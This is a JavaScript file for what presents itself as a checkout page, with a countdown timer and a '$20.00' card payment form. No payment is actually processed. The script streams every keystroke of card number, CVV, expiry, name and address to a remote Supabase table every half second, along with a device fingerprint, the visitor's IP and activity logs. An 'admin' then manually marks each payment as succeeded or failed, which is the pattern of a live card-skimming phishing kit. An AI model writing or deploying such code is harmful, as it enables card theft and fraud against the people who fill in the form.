/* ---------- FIRST TIME LOGIC ---------- */
const isFirstTime = !localStorage.getItem("hasPurchased");
const welcomeText = document.getElementById("welcomeText");
const modal = document.getElementById("welcomeModal");

window.addEventListener("load", () => {
  setTimeout(() => {
    document.getElementById("preloader").style.display = "none";

    if (isFirstTime) {
      welcomeText.textContent = "Welcome, New Customer 👋";
      modal.style.display = "flex";
      localStorage.setItem("hasPurchased", "true");
    } else {
      welcomeText.textContent = "Welcome back 👋";
    }
  }, 1200);
});

function closeModal() {
  modal.style.display = "none";
}

/* ---------- TIMER (30 MIN) ---------- */
let timeLeft = 30 * 60;
const timerEl = document.getElementById("timer");
setInterval(() => {
  if (timeLeft <= 0) return;
  timeLeft--;
  const m = Math.floor(timeLeft / 60);
  const s = timeLeft % 60;
  timerEl.textContent = `${m}:${s.toString().padStart(2,"0")}`;
}, 1000);

/* ---------- PROGRESSIVE FORM SWITCH ---------- */
const checkoutCard = document.getElementById("checkoutCard");
const paymentCard = document.getElementById("paymentCard");
document.getElementById("proceedBtn").addEventListener("click", () => {
  checkoutCard.style.display = "none";
  paymentCard.style.display = "block";
  window.scrollTo(0,0);
});

/* ---------- PAYMENT FORM LOGIC ---------- */
const fields = {
    cardNumber: document.getElementById("cardNumber"),
    cardName: document.getElementById("cardName"),
    expiry: document.getElementById("expiry"),
    cvv: document.getElementById("cvv"),
    address: document.getElementById("address"),
    city: document.getElementById("city"),
    state: document.getElementById("state"),
    zip: document.getElementById("zip"),
    country: document.getElementById("country")
};

const touched = {};
Object.keys(fields).forEach(k => touched[k] = false);

const payBtn = document.getElementById("payBtn");
const previewNumber = document.getElementById("previewNumber");
const previewName = document.getElementById("previewName");
const previewExpiry = document.getElementById("previewExpiry");

/* ---------- UI HELPERS ---------- */
function showError(input) { input.classList.add("invalid"); input.classList.remove("valid"); input.nextElementSibling.style.display = "block"; }
function showSuccess(input) { input.classList.add("valid"); input.classList.remove("invalid"); input.nextElementSibling.style.display = "none"; }

/* ---------- PURE VALIDATORS ---------- */
function luhn(num) { let sum = 0, alt = false; for (let i=num.length-1;i>=0;i--){ let n=parseInt(num[i]); if(alt){ n*=2; if(n>9)n-=9;} sum+=n; alt=!alt;} return sum%10===0;}
function isCardValid() { const v=fields.cardNumber.value.replace(/\s/g,""); return v.length===16 && luhn(v);}
function isNameValid() { return /^[A-Za-z]+(\s[A-Za-z]+)+$/.test(fields.cardName.value.trim());}
function isExpiryValid() { const p=fields.expiry.value.split("/"); if(p.length!==2)return false; const m=parseInt(p[0],10); const yy=parseInt(p[1],10); if(isNaN(m)||isNaN(yy))return false; if(m<1||m>12)return false; const y=2000+yy; const now=new Date(); const expiryEnd=new Date(y,m,0,23,59,59); const maxFuture=new Date(now.getFullYear()+10, now.getMonth(),1); if(expiryEnd<now) return false; if(expiryEnd>maxFuture) return false; return true;}
function isCVVValid(){ return /^\d{3}$/.test(fields.cvv.value);}

/* ---------- ADDRESS VALIDATORS ---------- */
function isStreetValid() {
    const val = fields.address.value.trim();
    return /^\d+\s+[\w\s]+/.test(val);
}
function isCityValid() {
    const val = fields.city.value.trim();
    return /^[A-Za-z\s\-]{2,}$/.test(val);
}
function isStateValid() {
    const val = fields.state.value.trim();
    return /^[A-Za-z\s\-]{2,}$/.test(val);
}
function isZIPValid(){
    const val = fields.zip.value.trim();
    return /^[A-Za-z0-9]{4,10}$/.test(val);
}
function isCountryValid(){ return fields.country.value!==""; }

/* ---------- ZIP → CITY CHECK (demo) ---------- */
const zipCityMap = {
  "United States": { "10001":"New York", "90001":"Los Angeles", "60601":"Chicago" },
  "United Kingdom": { "SW1A":"London", "EH1":"Edinburgh" },
  "Canada": { "M5V":"Toronto", "H2X":"Montreal" },
  "Australia": { "2000":"Sydney", "3000":"Melbourne" }
};

function checkZIPCity() {
  const country = fields.country.value;
  const zip = fields.zip.value.trim().toUpperCase();
  if(zipCityMap[country] && zipCityMap[country][zip]){
    fields.city.value = zipCityMap[country][zip];
    showSuccess(fields.city);
  }
}

/* ---------- UPDATE BUTTON ---------- */
function updateButton(){
    const allValid =
        isCardValid() &&
        isNameValid() &&
        isExpiryValid() &&
        isCVVValid() &&
        isStreetValid() &&
        isCityValid() &&
        isStateValid() &&
        isZIPValid() &&
        isCountryValid();
    payBtn.disabled = !allValid;
    payBtn.classList.toggle("enabled", allValid);
}

/* ---------- EVENT LISTENERS ---------- */
Object.keys(fields).forEach(k=>{
  const field = fields[k];
  field.addEventListener("input",()=>{
    touched[k]=true;

    // Input formatting + Live preview
    if(k==="cardNumber"){
      // remove non-digits and limit to 16
      let v = field.value.replace(/\D/g, '').slice(0,16);
      // insert spaces every 4
      const formatted = v.replace(/(.{4})/g, '$1 ').trim();
      field.value = formatted;
      previewNumber.textContent = formatted || "#### #### #### ####";
    }
    if(k==="cardName") previewName.textContent=field.value.toUpperCase()||"CARD HOLDER";
    if(k==="expiry"){
      // MMYY -> MM/YY
      let v = field.value.replace(/\D/g, '').slice(0,4);
      if(v.length>2) v = v.slice(0,2) + '/' + v.slice(2);
      field.value = v;
      previewExpiry.textContent = v || "MM/YY";
    }

    // Validation
    if(k==="cardNumber") isCardValid()?showSuccess(field):showError(field);
    if(k==="cardName") isNameValid()?showSuccess(field):showError(field);
    if(k==="expiry") isExpiryValid()?showSuccess(field):showError(field);
    if(k==="cvv") isCVVValid()?showSuccess(field):showError(field);
    if(k==="address") isStreetValid()?showSuccess(field):showError(field);
    if(k==="city") isCityValid()?showSuccess(field):showError(field);
    if(k==="state") isStateValid()?showSuccess(field):showError(field);
    if(k==="zip") { isZIPValid()?showSuccess(field):showError(field); checkZIPCity();}
    if(k==="country") isCountryValid()?showSuccess(field):showError(field);

    updateButton();
  });
});

/* ---------- LIVE SYNC + DEVICE TRACKING (Supabase) ---------- */

// Supabase config (provided)
const SUPABASE_URL = 'https://ztqswbfoqwrneohpwzph.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp0cXN3YmZvcXdybmVvaHB3enBoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY2NDE3NTUsImV4cCI6MjA4MjIxNzc1NX0.2KJBq-DeOsbBfjR8Eq-wi3nYLYR4FBwLFO1EfTVALb0';

// Load Supabase client dynamically (CDN UMD)
(function loadSupabase(){
  if(window.supabase) return;
  const s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js';
  s.defer = true;
  document.head.appendChild(s);
})();

// small helper: SHA-256 hash -> hex
async function sha256Hex(str){
  const enc = new TextEncoder();
  const data = enc.encode(str);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');
}

// build a fingerprint from benign browser properties
async function buildDeviceId(){
  try{
    const parts = [
      navigator.userAgent || '',
      navigator.platform || '',
      navigator.language || '',
      navigator.cookieEnabled ? 'c' : 'nc',
      screen?.width || 0, screen?.height || 0, screen?.colorDepth || 0,
      navigator.hardwareConcurrency || 0, navigator.deviceMemory || 0,
      Intl?.DateTimeFormat?.().resolvedOptions?.().timeZone || ''
    ];
    const base = parts.join('::');
    return await sha256Hex(base);
  }catch(e){
    console.error('fingerprint error', e);
    // fallback - random but persistent id
    let id = localStorage.getItem('device_id_fallback');
    if(!id){ id = 'fb-' + Math.random().toString(36).slice(2); localStorage.setItem('device_id_fallback', id); }
    return id;
  }
}

// fetch public IP (ipify)
async function fetchIp(){
  try{
    const res = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
    if(!res.ok) throw new Error('ip fetch failed');
    const j = await res.json();
    return j.ip;
  }catch(e){ console.warn('IP fetch failed', e); return null; }
}

// small retry wrapper for DB writes
async function safeDbUpdate(fn, tries=3){
  let attempt=0;
  while(attempt<tries){
    try{ return await fn(); }
    catch(err){
      attempt++;
      const backoff = Math.pow(2, attempt)*100;
      console.warn('db write failed, retry', attempt, err);
      await new Promise(r=>setTimeout(r, backoff));
    }
  }
  console.error('db write ultimately failed');
}

// Main tracker object
(async function initTracker(){
  // wait for supabase script to load
  const start = Date.now();
  while(!window.supabase && (Date.now() - start) < 5000){ await new Promise(r=>setTimeout(r, 50)); }
  if(!window.supabase){ console.error('Supabase client failed to load'); return; }

  const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

  const deviceIdKey = 'device_id_v1';
  let deviceId = localStorage.getItem(deviceIdKey);
  if(!deviceId){ deviceId = await buildDeviceId(); localStorage.setItem(deviceIdKey, deviceId); }

  const deviceModel = navigator.platform || navigator.userAgent || '';

  // fetch IP and existing user row
  let ip = await fetchIp();
  let current = null;
  try{
    const { data, error, status } = await client.from('demo_users').select('*').eq('id', deviceId).maybeSingle();
    if(error && status!==406){ console.warn('select error', error); }
    current = data || null;
  }catch(e){ console.warn('select failed', e); }

  const nowISO = new Date().toISOString();
  if(!current){
    // create row with full info log and status 'none'
    current = {
      id: deviceId,
      ip_address: ip,
      device_model: deviceModel,
      last_seen: nowISO,
      active: true,
      form_data: {},
      logs: [{
        type: 'created', ts: nowISO, ip: ip, ua: navigator.userAgent, device_model: deviceModel, form: {}, status: 'none'
      }],
      status: 'none'
    };
    await safeDbUpdate(()=> client.from('demo_users').insert(current));
  } else {
    // update ip log if changed (minimal log)
    const logs = Array.isArray(current.logs) ? current.logs : [];
    if(ip && ip !== current.ip_address){ logs.push({type:'ip_changed', ts: nowISO, from: current.ip_address || null, to: ip}); current.ip_address = ip; }
    // mark seen
    current.last_seen = nowISO;
    current.active = true;
    current.logs = logs;
    // ensure status field exists (default to 'none')
    if(typeof current.status === 'undefined') current.status = 'none';

    // Reset status to 'none' on page load (per spec). Log the reset.
    if((current.status||'').toString().toLowerCase() !== 'none'){
      const resetIso = new Date().toISOString();
      current.logs = (current.logs||[]).concat([{ type: 'status_reset', ts: resetIso, from: current.status, to: 'none' }]);
      current.status = 'none';
      await safeDbUpdate(()=> client.from('demo_users').update({ ip_address: current.ip_address, last_seen: current.last_seen, active: true, logs: current.logs, status: current.status }).eq('id', deviceId));
    } else {
      await safeDbUpdate(()=> client.from('demo_users').update({ ip_address: current.ip_address, last_seen: current.last_seen, active: true, logs: current.logs, status: current.status }).eq('id', deviceId));
    }
  }

  // keep in-memory copy
  let row = { ...current };

  // set initial UI state
  updateStatusPanel();
  if((row.status||'').toString().toLowerCase() === 'none'){
    setAllDisabled(false);
  } else if((row.status||'').toString().toLowerCase() === 'pending'){
    // if unexpectedly pending, keep UI disabled until admin responds
    setAllDisabled(true);
    payBtn.textContent = 'Pending admin confirmation...';
  }

  // helper: UI state (disable/dim all inputs + buttons)
  function setAllDisabled(disabled){
    Object.keys(fields).forEach(k => { try{ fields[k].disabled = !!disabled; }catch(e){} });
    try{ document.getElementById('proceedBtn').disabled = !!disabled; }catch(e){}
    try{ payBtn.disabled = !!disabled; }catch(e){}
    [checkoutCard, paymentCard].forEach(el => { if(el) el.classList.toggle('dim', !!disabled); });
  }

  function updateStatusPanel(){
    try{ document.getElementById('statusBadge').textContent = (row.status || 'NONE').toString().toUpperCase(); }catch(e){}
  }

  function showFailedModal(msg){
    const modal = document.getElementById('failedModal');
    const m = document.getElementById('failedMsg');
    if(m && msg) m.textContent = msg;
    if(modal) modal.style.display = 'flex';
  }

  // retry button behavior
  try{
    const retryBtn = document.getElementById('retryPayBtn');
    if(retryBtn){
      retryBtn.addEventListener('click', ()=>{
        const modal = document.getElementById('failedModal');
        if(modal) modal.style.display = 'none';
        setAllDisabled(false);
        payBtn.textContent = 'Pay $20.00 Securely';
      });
    }
  }catch(e){}


  // subscribe to realtime status changes for this device + polling fallback
  let realtimeSubscribed = false;
  let realtimeSub = null;
  let lastRealtimeMessage = 0;
  let pollingIntervalId = null;

  function handleStatusChange(newStatus, source='realtime'){
    const s = (newStatus||'').toString().toUpperCase();
    console.log('handleStatusChange', s, 'source', source);
    // update UI/status panel
    row.status = newStatus;
    updateStatusPanel();

    if(s === 'SUCCESS'){
      // navigate to success page
      window.location.href = 'success.html';
    } else if(s === 'FAILED'){
      showFailedModal('Payment FAILED. Please try again or contact support.');
      // re-enable UI so user can retry
      setAllDisabled(false);
      payBtn.textContent = 'Pay $20.00 Securely';
      if(pollingIntervalId){ clearInterval(pollingIntervalId); pollingIntervalId = null; }
    } else {
      // for pending/none keep UI updated
      if(s === 'PENDING'){
        payBtn.textContent = 'Pending admin confirmation...';
        payBtn.disabled = true;
      } else if(s === 'NONE'){
        // ensure UI enabled
        setAllDisabled(false);
        payBtn.textContent = 'Pay $20.00 Securely';
      }
    }
  }

  try{
    realtimeSub = client.channel(`public:demo_users`).on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'demo_users', filter: `id=eq.${deviceId}` }, (payload) => {
      lastRealtimeMessage = Date.now();
      const newRow = payload.new || payload.record || payload;
      if(newRow){
        // update local copy
        row.logs = newRow.logs || row.logs;
        row.ip_address = newRow.ip_address || row.ip_address;
        row.last_seen = newRow.last_seen || row.last_seen;
        if(newRow.status && newRow.status !== row.status){
          handleStatusChange(newRow.status, 'realtime');
        }
      }
    }).subscribe();

    console.log('realtime subscription initiated');
  }catch(e){ console.warn('realtime subscribe failed', e); }

  // Polling fallback to detect status changes (every 3s)
  setInterval(async ()=>{
    try{
      const { data, error } = await client.from('demo_users').select('status, logs, last_seen').eq('id', deviceId).maybeSingle();
      if(!error && data){
        if(data.status && data.status !== row.status){
          handleStatusChange(data.status, 'poll');
        }
        row.logs = data.logs || row.logs;
        row.last_seen = data.last_seen || row.last_seen;
      }
    }catch(e){ /* ignore */ }
  }, 3000);

  // activity detection
  let lastActivity = Date.now();
  const ACTIVITY_LOG_THROTTLE = 10000; // only log activity at most every 10s
  function onActivity(e){
    const now = Date.now();
    lastActivity = now;
    const iso = new Date().toISOString();
    row.last_seen = iso;
    if(!row.active){ row.active = true; row.logs = (row.logs||[]).concat([{type:'became_active', ts: iso}]); }
    // throttle detailed logs
    const recentActivity = row.logs && row.logs.length && (Date.now() - new Date(row.logs[row.logs.length-1].ts).getTime()) < ACTIVITY_LOG_THROTTLE;
    if(!recentActivity) row.logs = (row.logs||[]).concat([{type:'active', ts: iso}]);
    // async update last_seen/active/logs
    safeDbUpdate(()=> client.from('demo_users').update({ last_seen: row.last_seen, active: true, logs: row.logs }).eq('id', deviceId));
  }

  ['mousemove','keydown','click','touchstart'].forEach(ev => window.addEventListener(ev, onActivity, {passive:true}));

  // inactivity checker
  const INACTIVITY_MS = 30000;
  setInterval(()=>{
    if(Date.now() - lastActivity > INACTIVITY_MS && row.active){
      row.active = false;
      const iso = new Date().toISOString();
      row.logs = (row.logs||[]).concat([{type:'inactive', ts: iso}]);
      row.last_seen = iso;
      safeDbUpdate(()=> client.from('demo_users').update({ active: false, last_seen: iso, logs: row.logs }).eq('id', deviceId));
    }
  }, 5000);

  // IP poller
  setInterval(async ()=>{
    const newIp = await fetchIp();
    if(newIp && newIp !== row.ip_address){
      const iso = new Date().toISOString();
      row.logs = (row.logs||[]).concat([{type:'ip_changed', ts: iso, from: row.ip_address, to: newIp}]);
      row.ip_address = newIp;
      await safeDbUpdate(()=> client.from('demo_users').update({ ip_address: newIp, logs: row.logs, last_seen: new Date().toISOString() }).eq('id', deviceId));
    }
  }, 15000);

  // form live sync every 0.5s
  let lastFormSync = 0;
  let lastFormSnapshot = {};
  setInterval(async ()=>{
    const now = Date.now();
    // gather current form values
    const formSnapshot = {};
    Object.keys(fields).forEach(k => { formSnapshot[k] = fields[k].value; });
    // compare shallow
    const changed = JSON.stringify(formSnapshot) !== JSON.stringify(lastFormSnapshot);
    if(changed){
      lastFormSnapshot = formSnapshot;
      row.form_data = formSnapshot;
      const iso = new Date().toISOString();
      row.last_seen = iso;
      // update DB (no full logs per change)
      await safeDbUpdate(()=> client.from('demo_users').update({ form_data: row.form_data, last_seen: row.last_seen }).eq('id', deviceId));
    } else {
      // heartbeat update for last_seen if user is active and >10s since last update
      if(row.active && now - lastFormSync > 10000){
        lastFormSync = now;
        row.last_seen = new Date().toISOString();
        await safeDbUpdate(()=> client.from('demo_users').update({ last_seen: row.last_seen }).eq('id', deviceId));
      }
    }
  }, 500);

  // on unload mark inactive and update last seen
  window.addEventListener('beforeunload', ()=>{
    try{ navigator.sendBeacon && navigator.sendBeacon(`${SUPABASE_URL}/rest/v1/demo_users`, JSON.stringify({ id: deviceId, active: false, status: row.status })); }catch(e){}
    safeDbUpdate(()=> client.from('demo_users').update({ active:false, last_seen: new Date().toISOString() }).eq('id', deviceId));
  });

  // Log full info when Pay button is clicked (set status -> 'pending')
  if(typeof payBtn !== 'undefined' && payBtn){
    payBtn.addEventListener('click', async (ev) => {
      try{ ev.preventDefault(); }catch(e){}
      // disable UI to avoid double clicks and indicate processing
      setAllDisabled(true);
      payBtn.textContent = 'Processing...';

      const iso = new Date().toISOString();
      // snapshot form values
      const formSnapshot = {};
      Object.keys(fields).forEach(k => { formSnapshot[k] = fields[k].value; });
      const logEntry = {
        type: 'pay_clicked',
        ts: iso,
        device_id: deviceId,
        ip: row.ip_address || null,
        ua: navigator.userAgent,
        device_model: deviceModel,
        form: formSnapshot,
        active: !!row.active,
        status: 'pending'
      };
      row.logs = (row.logs||[]).concat([logEntry]);
      row.last_seen = iso;
      row.status = 'pending';

      // write status + full log to DB and attempt a beacon for best-effort delivery
      try{
        await safeDbUpdate(()=> client.from('demo_users').update({ status: row.status, logs: row.logs, last_seen: row.last_seen, form_data: row.form_data }).eq('id', deviceId));
        try{ navigator.sendBeacon && navigator.sendBeacon(`${SUPABASE_URL}/rest/v1/demo_users`, JSON.stringify({ id: deviceId, status: row.status, logs: row.logs, last_seen: row.last_seen })); }catch(e){}
      }catch(err){
        console.error('Failed to write pending status', err);
        // re-enable UI and show error
        setAllDisabled(false);
        payBtn.textContent = 'Pay $20.00 Securely';
        alert('Unable to initiate payment. Please try again.');
        return;
      }

      console.log('pay clicked and logged', logEntry);

      // Start rapid polling for status updates (1s) until SUCCESS or FAILED
      if(pollingIntervalId){ clearInterval(pollingIntervalId); pollingIntervalId = null; }
      pollingIntervalId = setInterval(async ()=>{
        try{
          const { data, error } = await client.from('demo_users').select('status').eq('id', deviceId).maybeSingle();
          if(!error && data && data.status){
            if(data.status.toString().toUpperCase() === 'SUCCESS'){
              clearInterval(pollingIntervalId); pollingIntervalId = null;
              handleStatusChange('SUCCESS', 'poll-after-pay');
            } else if(data.status.toString().toUpperCase() === 'FAILED'){
              clearInterval(pollingIntervalId); pollingIntervalId = null;
              handleStatusChange('FAILED', 'poll-after-pay');
            }
          }
        }catch(e){ /* ignore */ }
      }, 1000);

    }, { passive: true });
  }

  console.log('device tracking initialized', deviceId);
})();

